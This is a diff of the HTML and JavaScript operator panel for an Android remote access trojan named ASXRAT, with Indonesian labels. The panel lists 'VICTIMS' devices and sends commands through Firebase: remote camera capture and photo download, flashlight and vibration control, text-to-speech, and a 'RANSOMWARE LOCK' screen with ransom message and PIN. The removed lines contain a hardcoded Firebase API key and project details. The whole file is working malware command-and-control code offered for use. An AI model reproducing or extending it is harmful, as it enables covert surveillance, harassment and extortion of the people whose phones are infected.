@@ -1,43 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ASXRAT V1 | COMMANDER</title>
+    <title>ASXRAT V1 | MASTER COMMANDER</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         :root { --neon: #00f2ff; --bg: #050505; --card: #111; }
         body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; }
-        
-        /* LIST TARGET */
         #page-list { padding: 20px; }
         .device-card { background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border-left: 5px solid var(--neon); }
-
-        /* HEADER */
         .header { position: fixed; top: 0; width: 100%; background: #000; border-bottom: 1px solid var(--neon); padding: 15px; z-index: 100; display: flex; align-items: center; box-sizing: border-box; }
-        
-        /* DRAWER CONTROL */
         .drawer { position: fixed; top: 0; left: -300px; width: 290px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.4s; z-index: 200; padding: 20px; box-sizing: border-box; overflow-y: auto; }
         .drawer.active { left: 0; }
-        .drawer h3 { color: var(--neon); text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
-
         .menu-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: #1a1a1a; padding: 10px; border-radius: 8px; }
         .btn { padding: 8px 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; }
         .btn-on { background: #0f0; } .btn-off { background: #f00; color: #fff; }
         .btn-blue { background: var(--neon); width: 100%; margin-top: 5px; }
-
-        /* MAIN PANEL */
-        .main-content { padding: 80px 20px 20px 20px; text-align: center; }
-        input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; border-radius: 5px; margin-bottom: 5px; box-sizing: border-box; }
-        img { width: 100%; border-radius: 10px; border: 1px solid var(--neon); margin-top: 15px; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
+        .main-content { padding: 80px 20px; text-align: center; }
+        input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; margin-bottom: 5px; border-radius: 5px; box-sizing: border-box; }
+        img { width: 100%; border: 1px solid var(--neon); border-radius: 10px; margin-top: 15px; }
+        .overlay { position: fixed; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
         .overlay.active { display: block; }
     </style>
 </head>
 <body>
-
     <div class="overlay" id="overlay" onclick="toggleDrawer()"></div>
-
+    
     <div id="page-list">
         <h1 style="color:var(--neon); text-align:center;">ASXRAT | VICTIMS</h1>
         <div id="targetList">Scanning...</div>
@@ -47,28 +36,25 @@
         <div class="header">
             <button onclick="toggleDrawer()" style="background:var(--neon); border:none; padding:10px; font-weight:bold; border-radius:5px;">☰ REMOTE</button>
             <span id="activeName" style="margin-left:15px; color:var(--neon); font-weight:bold;"></span>
-            <button onclick="location.reload()" style="margin-left:auto; background:red; border:none; color:white; padding:10px; border-radius:5px;">EXIT</button>
+            <button onclick="location.reload()" style="margin-left:auto; background:red; border:none; color:#fff; padding:10px; border-radius:5px;">EXIT</button>
         </div>
 
         <div class="drawer" id="drawer">
-            <h3>REMOTE CONTROL</h3>
+            <h3 style="color:var(--neon); border-bottom:1px solid #333; padding-bottom:10px;">REMOTE COMMANDS</h3>
             <div class="menu-row"><span>SENTER</span><div><button class="btn btn-on" onclick="cmd('flash','on')">ON</button><button class="btn btn-off" onclick="cmd('flash','off')">OFF</button></div></div>
             <div class="menu-row"><span>GETAR</span><div><button class="btn btn-on" onclick="cmd('vbt_on')">BOM</button><button class="btn btn-off" onclick="cmd('vbt_off')">OFF</button></div></div>
-            
             <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:15px;">
                 <span>KIRIM SUARA</span><input type="text" id="vT" placeholder="Pesan..."><button class="btn btn-blue" onclick="speak()">KIRIM</button>
             </div>
-
             <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:15px;">
                 <span>MUSIK MP3</span><input type="text" id="mT" placeholder="Link MP3"><button class="btn btn-on" style="width:48%" onclick="playM()">PLAY</button><button class="btn btn-off" style="width:48%" onclick="cmd('stop_music')">STOP</button>
             </div>
-
-            <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:15px;">
+            <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:15px; border:1px solid red;">
                 <span style="color:red; font-weight:bold;">RANSOMWARE LOCK</span>
                 <input type="text" id="rT" placeholder="Judul Lock">
                 <input type="text" id="rM" placeholder="Pesan Penebusan">
                 <input type="number" id="rP" placeholder="Set PIN (4 digit)">
-                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">LOCK PERANGKAT</button>
+                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">SEND LOCK SCREEN</button>
             </div>
         </div>
 
@@ -79,22 +65,14 @@
             </div>
             <div style="background:#111; padding:20px; border-radius:10px; margin-top:20px; border:1px solid #222;">
                 <h3>📸 PANEL KAMERA</h3>
-                <button class="btn btn-blue" style="padding:15px;" onclick="cmd('snap')">AMBIL FOTO SEKARANG</button>
+                <button class="btn btn-blue" style="padding:15px;" onclick="cmd('snap')">AMBIL FOTO</button>
                 <div id="photoArea"></div>
             </div>
         </div>
     </div>
 
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
-            authDomain: "control-rat.firebaseapp.com",
-            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "control-rat",
-            storageBucket: "control-rat.appspot.com",
-            messagingSenderId: "181283651682",
-            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
-        };
+        const firebaseConfig = { /* PASTE CONFIG LO DI SINI */ };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         let selectedID = "";
@@ -106,7 +84,7 @@
                 list.innerHTML += `<div class="device-card" onclick="openControl('${id}','${d.model}')"><span>📱 <b>${d.model}</b></span><span style="color:#0f0">● ONLINE</span></div>`;
                 if(id === selectedID) {
                     document.getElementById('dispBatt').innerText = "Battery: " + (d.battery || "??");
-                    if(d.foto) document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download><button class="btn-blue" style="padding:10px; border:none; border-radius:5px;">SAVE FOTO</button></a>`;
+                    if(d.foto) document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download><button class="btn-blue" style="padding:10px; border:none; border-radius:5px;">SIMPAN KE GALERI</button></a>`;
                 }
             });
         });
@@ -118,7 +96,6 @@
             document.getElementById('activeName').innerText = model;
             document.getElementById('dispModel').innerText = model;
         }
-
         function toggleDrawer() { document.getElementById('drawer').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
         function cmd(type, stat='') { db.ref('commands/'+selectedID).push({type: type, status: stat}); }
         function speak() { const t = document.getElementById('vT').value; db.ref('commands/'+selectedID).push({type:'speak', text:t || "Dongo"}); document.getElementById('vT').value=""; }
@@ -130,11 +107,11 @@
             const p = document.getElementById('rP').value;
             db.ref('commands/'+selectedID).push({
                 type: "lock",
-                title: t || "DEVICE ENCRYPTED",
-                msg: m || "Pay to unlock.",
+                title: t || "SYSTEM ENCRYPTED",
+                msg: m || "Contact owner for decryption PIN.",
                 pin: p || "1234"
             });
-            alert("Ransomware Terkirim!"); toggleDrawer();
+            alert("Lock Screen Terkirim!"); toggleDrawer();
         }
     </script>
 </body>
